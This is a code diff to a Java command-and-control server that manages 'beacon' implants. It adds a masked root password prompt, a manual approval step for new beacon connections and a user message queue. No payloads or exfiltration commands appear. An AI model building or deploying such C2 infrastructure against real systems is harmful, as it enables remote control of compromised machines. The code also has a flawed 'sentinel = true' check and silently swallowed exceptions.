@@ -1,5 +1,6 @@
 package Servers.C2;
 
+import java.io.Console;
 import java.io.IOException;
 import java.net.ServerSocket;
 import java.net.Socket;
@@ -8,8 +9,7 @@ import java.nio.charset.StandardCharsets;
 import java.security.MessageDigest;
 import java.util.ArrayList;
 import java.util.HashMap;
-import java.util.Map;
-import java.util.TreeMap;
+import java.util.Scanner;
 
 import org.json.JSONObject;
 
@@ -32,9 +32,6 @@ public class C2Server implements Runnable{
     // Bionded Server Socket
     private ServerSocket serverSocket;
 
-    // Pointer to the Handler for User Input
-    private C2ServerUserHandler userHandler;
-
     // Pointer to the API Handler
     private C2ServerAPI apiHandler;
 
@@ -53,10 +50,13 @@ public class C2Server implements Runnable{
     // Object used to do RSA encryption and Decryption
     private rsa rsa;
 
-    // Text colors for Hard visuals
-    private String GREEN = "\u001B[32m";
-    private String RESET = "\u001B[37m";
-    private String RED = "\u001B[31m";
+    // Console Used so that the User's input of passwords is masked
+    private Console passwordInputConsole;
+
+    // Scanner for the user to enter input
+    private Scanner userInputScanner;
+
+    private HashMap<Integer, String> userMessageList;
 
     /**
      * Initializes a Command and Control Server to handle connections from Long Range Beacons
@@ -68,12 +68,14 @@ public class C2Server implements Runnable{
         this.shellID = 0;
         this.longRangeBeacons = new HashMap<>();
         this.serverSocket = new ServerSocket(1234);
-        this.userHandler = new C2ServerUserHandler(this);
         this.apiHandler = new C2ServerAPI(this);
         this.rsa = new rsa(1024);
         this.windowsClientResponses = new HashMap<>();
         this.linuxClientResponses = new HashMap<>();
         this.usernamesPasswords = new HashMap<>();
+        this.passwordInputConsole = System.console();
+        this.userInputScanner = new Scanner(System.in);
+        this.userMessageList = new HashMap<>();
     }
 
     /**
@@ -106,9 +108,11 @@ public class C2Server implements Runnable{
      * @return true or false, based on if authentication was successful or not
      */
     protected boolean authenticate(String username, String hashedPassword){
-        if(usernamesPasswords.get(username).equals(hashedPassword)){
-            return true;
-        }
+        try{
+            if(usernamesPasswords.get(username).equals(hashedPassword)){
+                return true;
+            }
+        } catch (Exception e){}        
         return false;
     }
 
@@ -141,9 +145,9 @@ public class C2Server implements Runnable{
      * 
      * @param message Message to be displayed in the User CLI
      */
-    protected void outputToUserHandler(String message){
-        synchronized(userHandler){
-            userHandler.outputToCLI(message);
+    protected void outputToUser(String message){
+        synchronized(userMessageList){
+            userMessageList.put(userMessageList.size(), message);
         }
     }
 
@@ -300,6 +304,20 @@ public class C2Server implements Runnable{
         return responses;
     }
 
+    protected void disableUser(String username){
+        usernamesPasswords.remove(username);
+    }
+
+    protected ArrayList<String> getUserMessages(int messagesRead){
+        ArrayList<String> newMessages = new ArrayList<>();
+        synchronized(userMessageList){
+            for(int i = messagesRead; i < userMessageList.size(); i++){
+                newMessages.add(userMessageList.get(i));
+            }
+        }
+        return newMessages;
+    }
+
     /**
      * This Function takes an IP address, with a wildcard character, and returns all
      * Matches for that IP Address. 
@@ -344,35 +362,6 @@ public class C2Server implements Runnable{
             }
         }
         return matches;
-    }
-
-    protected String formatClientStatus(HashMap<String, Boolean> clientStatus){
-        // Creating fire visually pleasing table of client status
-        String table = " ________________________________________________\n";
-        table += String.format("| %-20s | %-23s |\n", "IP", "Connection Status");
-        table += "|______________________|_________________________|\n";
-        Map<String, Boolean> sortedByKey = new TreeMap<>(clientStatus);
-        for (String ip : sortedByKey.keySet()) {
-            String status;
-            boolean status_bool;
-            if (clientStatus.get(ip)) {
-                status = GREEN + "CONNECTED :D" + RESET;
-                status_bool = false;
-            } else {
-                status = RED + "DISCONNECTED D:" + RESET;
-                status_bool = true;
-            }
-            // If the status is disconnected
-            if (status_bool){
-                table += String.format("| %-20s | %-33s |\n", ip, status);
-            }
-            // If the status is connected
-            else {
-                table += String.format("| %-20s | %-33s |\n", ip, status);
-            }
-        }
-        table += "|______________________|_________________________|\n";
-        return table;
     }
 
     /**
@@ -421,9 +410,20 @@ public class C2Server implements Runnable{
     
     @Override
     public void run(){
-        // Start Thread to handle commands from the user
-        Thread userHandlerThread = new Thread(userHandler);
-        userHandlerThread.start();
+        // User enters root password
+        String password1 = "";
+        String password2 = "a";
+        while(!(password1.equals(password2))){
+            password1 = new String(passwordInputConsole.readPassword("Enter root Password: "));
+            password2 = new String(passwordInputConsole.readPassword("Re-enter root Password: "));
+            if(!(password1.equals(password2))){
+                System.out.println("Passwords do not match");
+            }
+        }
+
+        // This password is stored as the root password in the Password database
+        updateUsernamePassword("root", C2Server.hashPassword(password1));
+        
         
         // Start API
         Thread apiHandlerThread = new Thread(apiHandler);
@@ -463,7 +463,12 @@ public class C2Server implements Runnable{
                 String authResponse;
                 // Pass this hash to the User Handler thread for MFA
                 if(authenticate("root", hashedPassForAuth)){
-                    authResponse = userHandler.authenticateToC2(IPAddress);
+                    System.out.print("New Beacon Entered Password Correctly from " + IPAddress + ". Allow connection to C2 Server? (y/n) ");
+                    if(userInputScanner.nextLine().toLowerCase().equals("y")){
+                        authResponse = "Authentication Successful";
+                    }else{
+                        authResponse = "Authentication Failed: C2 Server Denied MFA Prompt";
+                    }
                 } else {
                     authResponse = "Authentication Failed: Incorrect Password";
                 }
@@ -485,7 +490,7 @@ public class C2Server implements Runnable{
                 }
                 
             } catch(SocketException e){
-                userHandler.outputToCLI("Attempted Beacon Authentication failed from " + attemptedAuthIP);
+                outputToUser("Attempted Beacon Authentication failed from " + attemptedAuthIP);
             } catch(IOException e){
                 // Only print out when sentinel is true, if sentinel is false, then the C2 Server is shutting down
                 if(sentinel = true){
